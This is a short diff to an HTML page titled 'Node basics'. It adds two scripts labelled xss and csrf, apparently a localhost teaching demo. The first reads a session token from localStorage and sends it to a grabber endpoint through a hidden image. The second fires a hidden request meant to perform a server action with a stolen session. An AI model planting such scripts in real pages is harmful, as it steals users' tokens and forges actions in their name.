@@ -11,5 +11,30 @@
     <h1>Node basics</h1>
     <button id="button">Go</button>
     <script type="text/javascript" src="./script.js"></script>
+
+    <!-- xss -->
+    <script>
+        var token = window.localStorage.getItem('token');
+        var img=document.createElement("img");
+        img.setAttribute('src', 'http://localhost:8070/xss-grab-token?token=' + token);
+        img.setAttribute('width', 0);
+        img.setAttribute('height', 0);
+        document.body.appendChild(img);
+    </script>
+    <!-- xss -->
+
+    <!-- csrf -->
+    <script>
+        var img=document.createElement("img");
+        // known url that makes some operations on server
+        img.setAttribute('src', 'http://localhost:8060/csrf-send-request-from8080-with-grabbed-session-to8060');
+        img.setAttribute('width', 0);
+        img.setAttribute('height', 0);
+        document.body.appendChild(img);
+    </script>
+    <!-- csrf -->
+
+
+
 </body>
 </html>
